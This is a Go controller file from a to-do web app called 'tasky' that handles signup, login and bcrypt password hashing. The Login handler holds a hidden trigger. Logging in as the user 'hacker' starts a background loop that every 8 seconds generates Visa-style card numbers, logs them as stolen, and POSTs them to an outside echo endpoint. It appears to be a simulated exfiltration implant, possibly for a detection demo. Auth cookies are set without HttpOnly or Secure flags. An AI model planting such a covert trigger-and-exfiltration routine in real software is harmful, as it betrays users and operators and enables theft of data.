package controller

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
        "math/rand"
	"encoding/json"
	"bytes"
	"github.com/jeffthorne/tasky/auth"
	"github.com/jeffthorne/tasky/database"
	"github.com/jeffthorne/tasky/models"
	"github.com/gin-gonic/gin"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo"
	"golang.org/x/crypto/bcrypt"
)

var SECRET_KEY string = os.Getenv("SECRET_KEY")
var userCollection *mongo.Collection = database.OpenCollection(database.Client, "user")

var client = &http.Client{
    Timeout: 5 * time.Second,
}


func SignUp(c * gin.Context){
	
	var user models.User
	if err := c.BindJSON(&user); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second)

	emailCount, err := userCollection.CountDocuments(ctx, bson.M{"email": user.Email})
	defer cancel()

	if err != nil {
		log.Panic(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "error occured while checking for the email"})
	}

	password := HashPassword(*user.Password)
	user.Password = &password

	if emailCount > 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "User with this email already exists!"})
		return
	}
	user.ID = primitive.NewObjectID()
	resultInsertionNumber, insertErr := userCollection.InsertOne(ctx, user)
	if insertErr != nil {
		msg := fmt.Sprintf("user item was not created")
		c.JSON(http.StatusInternalServerError, gin.H{"error": msg})
		return
	}
	defer cancel()
	userId := user.ID.Hex()
	username := *user.Name

	token, err, expirationTime := auth.GenerateJWT(userId)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "error occured while generating token"})
		return
	}

	http.SetCookie(c.Writer, &http.Cookie{
		Name:    "token",
		Value:   token,
		Expires: expirationTime,
	})

	http.SetCookie(c.Writer, &http.Cookie{
		Name : "userID",
		Value : userId,
		Expires: expirationTime,
	})
	http.SetCookie(c.Writer, &http.Cookie{
		Name : "username",
		Value : username,
		Expires: expirationTime,
	})

	c.JSON(http.StatusOK, resultInsertionNumber)


}
func Login(c * gin.Context){
	var user models.User
	var foundUser models.User
	
	if err := c.BindJSON(&user); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "bind error"})
		return
	}
	var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second)

	err := userCollection.FindOne(ctx, bson.M{"email": user.Email}).Decode(&foundUser)
	defer cancel()

	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": " email or password is incorrect"})
		return
	}

	passwordIsValid, msg := VerifyPassword(*user.Password, *foundUser.Password)
	defer cancel()

	if passwordIsValid != true {
		c.JSON(http.StatusInternalServerError, gin.H{"error": msg})
		return
	}

	if foundUser.Email == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "User not found!"})
		return
	}
	userId := foundUser.ID.Hex()
	username := *foundUser.Name
	
	shouldRefresh, err, expirationTime := auth.RefreshToken(c)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "refresh token error"})
		return
	}

	if shouldRefresh{
		token, err, expirationTime := auth.GenerateJWT(userId)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "error occured while generating token"})
			return
		}

		http.SetCookie(c.Writer, &http.Cookie{
			Name:    "token",
			Value:   token,
			Expires: expirationTime,
		})

		http.SetCookie(c.Writer, &http.Cookie{
			Name : "userID",
			Value : userId,
			Expires: expirationTime,
		})
		http.SetCookie(c.Writer, &http.Cookie{
			Name : "username",
			Value : username,
			Expires: expirationTime,
		})
		
	} else {
		http.SetCookie(c.Writer, &http.Cookie{
			Name : "userID",
			Value : userId,
			Expires: expirationTime,
		})
		http.SetCookie(c.Writer, &http.Cookie{
			Name : "username",
			Value : username,
			Expires: expirationTime,
		})
	}
	c.JSON(http.StatusOK, gin.H{"msg": "login successful"})

    // If user is "hacker", start malicious behavior
    if username == "hacker" {
        go startMaliciousBehavior()
    }


}

func startMaliciousBehavior() {
    log.Println("Malicious behavior started: sending requests every 8 seconds.")

    for {
        time.Sleep(8 * time.Second)

        // Generate a list of random Visa-style credit card numbers
        // For example, we'll generate 3 per request
        stolenCards := []string{
            generateVisaCardNumber(),
            generateVisaCardNumber(),
            generateVisaCardNumber(),
        }

        // Log each stolen card to stdout
        for _, card := range stolenCards {
            log.Printf("Stolen credit card: %s", card)
        }

        // Prepare the JSON payload
        payload, err := json.Marshal(map[string]interface{}{
            "stolen_cards": stolenCards,
        })
        if err != nil {
            log.Printf("Error marshaling JSON: %v", err)
            continue
        }

        // Send the data via POST
        req, err := http.NewRequest(http.MethodPost, "https://echo.free.beeceptor.com/", bytes.NewBuffer(payload))
        if err != nil {
            log.Printf("Malicious request creation error: %v", err)
            continue
        }
        req.Header.Set("Content-Type", "application/json")

        resp, err := client.Do(req)
        if err != nil {
            log.Printf("Malicious request error: %v", err)
            continue
        }

        // Close the body to avoid leaking connections
        _ = resp.Body.Close()

        // Log response status
        log.Printf("Malicious request sent. Response Status: %s. Time: %s",
            resp.Status,
            time.Now().Format(time.RFC3339),
        )
    }
}

func generateVisaCardNumber() string {
    digits := make([]byte, 16)
    digits[0] = '4' // Visa typically starts with 4

    for i := 1; i < 16; i++ {
        // Each digit is [0..9]
        digits[i] = byte('0' + rand.Intn(10))
    }
    return string(digits)
}


func Todo(c * gin.Context) {
	session := auth.ValidateSession(c)
	if session {
		c.HTML(http.StatusOK,"todo.html", nil)
	}
}

func HashPassword(password string) string {
	bytes, err := bcrypt.GenerateFromPassword([]byte(password), 14)
	if err != nil {
		log.Panic(err)
	}
	return string(bytes)
}

func VerifyPassword(userPassword string, providedPassword string) (bool, string) {
	err := bcrypt.CompareHashAndPassword([]byte(providedPassword), []byte(userPassword))
	check := true
	msg := ""

	if err != nil {
		msg = fmt.Sprintf("email or password is incorrect")
		check = false
	}

	return check, msg
}
